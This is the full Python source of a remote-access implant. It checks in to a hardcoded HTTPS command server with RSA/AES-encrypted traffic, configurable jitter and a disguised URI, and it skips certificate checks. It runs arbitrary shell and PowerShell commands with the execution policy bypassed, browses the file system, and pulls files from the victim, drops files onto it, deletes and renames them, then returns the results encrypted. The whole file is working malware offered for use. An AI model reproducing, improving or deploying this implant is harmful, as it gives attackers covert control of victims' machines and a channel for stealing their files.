# pyinstaller --onefile HTTPS_RSA.py

import requests
import time
import random
import subprocess
import threading
import base64
import urllib3
import os
import json
from datetime import datetime
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SERVER_IP = "192.168.1.107"
SERVER_PORT = 6666
SERVER_BASE = f"https://{SERVER_IP}:{SERVER_PORT}" 
AUTH_ID = "982e781b-edee-4c10-918f-aa5d0a71e002"

RSA_PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArzyg7KTBT/MpciW4UKSk
jWUz6y87YLNktzndjJvIpYTReAzK3ewzJihvz5l/uF4dCPZVhl9zvQW/9X501SmU
nCPz4F+iiunt4mXVqv4rK3/QAM5UH3gUwTdFTnUCYMR94ZoR0NvKfIDnDV6sZxiR
ETOwK5w+aQNF6H1/NcB1UuPKz1GpLtY9jcYYV6x+ihT1V/rGfFHdpNySHD6og+z1
NSq0D3JiGAuSSfhhV+aPCZ8By8eh735r50WCiBFUw3Bd6oPjyeKDwUVBgGip+3UH
0tlqFIZxHBPTCSZ6zJDW+40XWLlRSk5z1PLBJokiEQLiyxmA34rbmUzsRBD32L9y
jwIDAQAB
-----END PUBLIC KEY-----"""

DEFAULT_USER_AGENT = "Mozilla/5.0"
status_base64 = True
b64encode = base64.urlsafe_b64encode if status_base64 else base64.b64encode
b64decode = base64.urlsafe_b64decode if status_base64 else base64.b64decode

PREPEND_OUTPUT = ""
APPEND_OUTPUT = ""
GET_CLIENT_HEADERS = {}
POST_CLIENT_HEADERS = {}

rsa_public_key = RSA.import_key(RSA_PUBLIC_KEY_PEM)
rsa_cipher = PKCS1_OAEP.new(rsa_public_key)
SSL_VERIFY = False

class AESCipherHttp:
    def __init__(self, key):
        self.key = key

    def _pad(self, s):
        pad_len = 16 - len(s) % 16
        return s + bytes([pad_len]) * pad_len

    def _unpad(self, s):
        return s[:-s[-1]]

    def encrypt(self, raw):
        raw = raw.encode('utf-8') if isinstance(raw, str) else raw
        raw = self._pad(raw)
        iv = get_random_bytes(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(raw)
        return b64encode(iv + encrypted).decode('utf-8')

    def decrypt(self, enc):
        try:
            enc = b64decode(enc)
            iv = enc[:16]
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(enc[16:])
            return self._unpad(decrypted).decode('utf-8', errors='replace')
        except:
            return ""

session_id = None
uris = ["/support/troubleshoot"]
current_user_agent = DEFAULT_USER_AGENT
sleep_time = 60.0
start_jitter = 0
end_jitter = 0
aes_cipher = None

def get_url():
    return SERVER_BASE + random.choice(uris)

def parse_headers(headers_value):
    if not headers_value:
        return {}
    if isinstance(headers_value, dict):
        return headers_value
    if not isinstance(headers_value, str):
        return {}
    result = {}
    for line in headers_value.splitlines():
        line = line.strip()
        if not line or ':' not in line:
            continue
        key, value = line.split(':', 1)
        result[key.strip()] = value.strip()
    return result

def get_request_headers(method="POST"):
    headers = {"User-Agent": current_user_agent}
    if method.upper() == "POST":
        headers["Content-Type"] = "application/json"
        headers.update(POST_CLIENT_HEADERS)
    else:
        headers.update(GET_CLIENT_HEADERS)
    return {k: v for k, v in headers.items() if v}

def apply_jitter():
    global sleep_time, start_jitter, end_jitter
    if start_jitter > end_jitter:
        start_jitter, end_jitter = end_jitter, start_jitter
    jitter_amount = random.randint(start_jitter, end_jitter)
    final_sleep = sleep_time + jitter_amount
    final_sleep = max(10, min(600, final_sleep))
    time.sleep(final_sleep)

def checkin():
    global session_id, uris, current_user_agent, sleep_time, start_jitter, end_jitter
    global PREPEND_OUTPUT, APPEND_OUTPUT, aes_cipher, GET_CLIENT_HEADERS, POST_CLIENT_HEADERS

    aes_key = get_random_bytes(32)
    aes_cipher_local = AESCipherHttp(aes_key)

    try:
        encrypted_token = b64encode(rsa_cipher.encrypt(AUTH_ID.encode())).decode('utf-8')
        encrypted_aes_key = b64encode(rsa_cipher.encrypt(aes_key)).decode('utf-8')

        payload = {
            "action": "checkin",
            "token": encrypted_token,
            "aes_key": encrypted_aes_key
        }

        response = requests.post(
            get_url(),
            json=payload,
            headers=get_request_headers("POST"),
            verify=SSL_VERIFY 
        )

        if response.status_code != 200:
            return False

        data = response.json()
        session_id = data.get("sid", "")
        if not session_id:
            return False

        current_user_agent = data.get("ua", DEFAULT_USER_AGENT)
        start_jitter = int(data.get("sj", 0))
        end_jitter = int(data.get("ej", 0))
        sleep_time = float(data.get("sl", 60.0))
        uris = data.get("ur", uris)
        PREPEND_OUTPUT = data.get("pre", "")
        APPEND_OUTPUT = data.get("app", "")

        GET_CLIENT_HEADERS.clear()
        GET_CLIENT_HEADERS.update(parse_headers(data.get("gh", "")))
        POST_CLIENT_HEADERS.clear()
        POST_CLIENT_HEADERS.update(parse_headers(data.get("ph", "")))

        aes_cipher = aes_cipher_local
        return True
    except Exception as e:
        print(f"[!] checkin error: {e}")
        return False

def get_tasks():
    global aes_cipher
    if not session_id or not aes_cipher:
        return None
    try:
        resp = requests.post(
            get_url(),
            json={"action": "get_tasks", "sid": session_id},
            headers=get_request_headers("POST"),
            verify=SSL_VERIFY 
        )
        if resp.status_code == 200:
            data = resp.json()
            if data.get("command"):
                return aes_cipher.decrypt(data["command"]).strip()
    except Exception as e:
        print(f"[!] get_tasks error: {e}")
    return None

def submit_output(output):
    global aes_cipher
    if not session_id or not aes_cipher:
        return
    encrypted = aes_cipher.encrypt(output) or ""
    
    prepend = PREPEND_OUTPUT or ""
    append = APPEND_OUTPUT or ""
    
    final_output = prepend + encrypted + append
    
    try:
        requests.post(
            get_url(),
            json={
                "action": "submit",
                "sid": session_id,
                "out": final_output
            },
            headers=get_request_headers("POST"),
            verify=SSL_VERIFY  
        )
    except Exception as e:
        print(f"[!] submit error: {e}")

def run_cmd_command(cmd):
    try:
        result = subprocess.run(
            cmd,
            shell=True, capture_output=True,
            text=True, encoding="utf-8", errors="replace",
        )
        output = result.stdout + result.stderr
        if result.returncode != 0:
            output += f"\n[Exit Code: {result.returncode}]"
        return output.strip() if output.strip() else "[+] Command executed (no output)"
    except subprocess.TimeoutExpired:
        return "[-] Command timed out"
    except Exception as e:
        return f"[-] CMD error: {str(e)}"

def run_powershell_command(ps_cmd):
    try:
        result = subprocess.run(
            ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_cmd],
            capture_output=True, text=True, encoding="utf-8", errors="replace",
        )
        output = result.stdout + result.stderr
        if result.returncode != 0:
            output += f"\n[Exit Code: {result.returncode}]"
        return output.strip() if output.strip() else "[+] PowerShell executed (no output)"
    except subprocess.TimeoutExpired:
        return "[-] PowerShell timed out"
    except Exception as e:
        return f"[-] PowerShell error: {str(e)}"

def browse_directory(path):
    try:
        if path.startswith('~'):
            path = os.path.expanduser(path)     
        if not os.path.exists(path):
            return {'success': False,'error': f"Path does not exist: {path}",'current_path': path,'parent_path': None,'items': []}
        items = []
        try:
            entries = os.listdir(path)
        except PermissionError:
            return {'success': False,'error': f"Permission denied to access {path}",'current_path': path,'parent_path': None,'items': []}
        
        for item in entries:
            item_path = os.path.join(path, item)
            try:
                stat = os.stat(item_path)
                is_dir = os.path.isdir(item_path)
                modified_timestamp = stat.st_mtime
                modified_time = datetime.fromtimestamp(modified_timestamp).strftime('%Y-%m-%d %H:%M:%S')
                size_bytes = stat.st_size if not is_dir else 0    
                items.append({'name': item,'type': 'directory' if is_dir else 'file','size': size_bytes,'modified_time': modified_time})
            except (PermissionError, OSError):
                continue
        items.sort(key=lambda x: (x['type'] != 'directory', x['name'].lower()))
        parent_path = os.path.dirname(path)
        if path.endswith(':\\') or path == '/':
            parent_path = None
        elif parent_path == path:
            parent_path = None
        return {'success': True,'current_path': path,'parent_path': parent_path,'items': items}
    except Exception as e:
        return {'success': False,'error': str(e),'current_path': path,'parent_path': None,'items': []}

def download_file(filepath):
    try:
        if not os.path.exists(filepath):
            return f"ERROR: File not found: {filepath}"
        
        filesize = os.path.getsize(filepath)
        filename = os.path.basename(filepath)
        
        with open(filepath, 'rb') as f:
            file_data = f.read()
        
        file_data_b64 = base64.b64encode(file_data).decode('ascii')
        
        return f"file-data:{filename}|{filesize}|{file_data_b64}"
        
    except Exception as e:
        return f"ERROR: {str(e)}"

def upload_file(filepath, filedata_b64):
    try:
        file_data = base64.b64decode(filedata_b64)
        
        directory = os.path.dirname(filepath)
        if directory and not os.path.exists(directory):
            os.makedirs(directory)
        
        with open(filepath, 'wb') as f:
            f.write(file_data)
        
        return f"SUCCESS: File uploaded to {filepath}"
        
    except Exception as e:
        return f"ERROR: {str(e)}"

def delete_file(filepath):
    try:
        if os.path.isdir(filepath):
            os.rmdir(filepath)
        else:
            os.remove(filepath)
        return f"SUCCESS: Deleted {filepath}"
    except Exception as e:
        return f"ERROR: {str(e)}"

def rename_file(old_path, new_path):
    try:
        os.rename(old_path, new_path)
        return f"SUCCESS: Renamed to {new_path}"
    except Exception as e:
        return f"ERROR: {str(e)}"

def execute_command(cmd):
    cmd = (cmd or "").strip()
    if not cmd:
        return "[no command]"
    
    if cmd.lower() == "ping":
        return "pong"
    
    if cmd.startswith("browse:"):
        browse_path = cmd[7:].strip()
        if not browse_path:
            browse_path = os.getcwd()
        dir_data = browse_directory(browse_path)
        json_str = json.dumps(dir_data, ensure_ascii=False)
        base64_data = base64.b64encode(json_str.encode('utf-8')).decode('ascii')
        return f"browse-data-{base64_data}"
    
    if cmd.startswith("download-file:"):
        filepath = cmd[14:].strip()
        result = download_file(filepath)
        return result
    
    if cmd.startswith("upload-file:"):
        parts = cmd[12:].split('|', 1)
        if len(parts) == 2:
            filepath, filedata_b64 = parts
            result = upload_file(filepath, filedata_b64)
            return result
        else:
            return b"ERROR: Invalid upload format"
    
    if cmd.startswith("delete-file:"):
        filepath = cmd[12:].strip()
        result = delete_file(filepath)
        return result
    
    if cmd.startswith("rename-file:"):
        parts = cmd[12:].split('|', 1)
        if len(parts) == 2:
            old_path, new_path = parts
            result = rename_file(old_path, new_path)
            return result
        else:
            return b"ERROR: Invalid rename format"

    upper = cmd.upper()
    if upper.startswith("EP "):
        return run_powershell_command(cmd[3:].strip())
    if upper.startswith("EP"):
        return run_powershell_command(cmd[2:].strip())
    return run_cmd_command(cmd)

def main_loop():
    while not session_id:
        if checkin():
            break
        time.sleep(random.uniform(20, 60))
    while True:
        try:
            command = get_tasks()
            if command:
                result = execute_command(command)
                submit_output(result)
            else:
                pass
            apply_jitter()
        except KeyboardInterrupt:
            break
        except:
            time.sleep(random.randint(30, 120))

if __name__ == "__main__":
    main_loop()
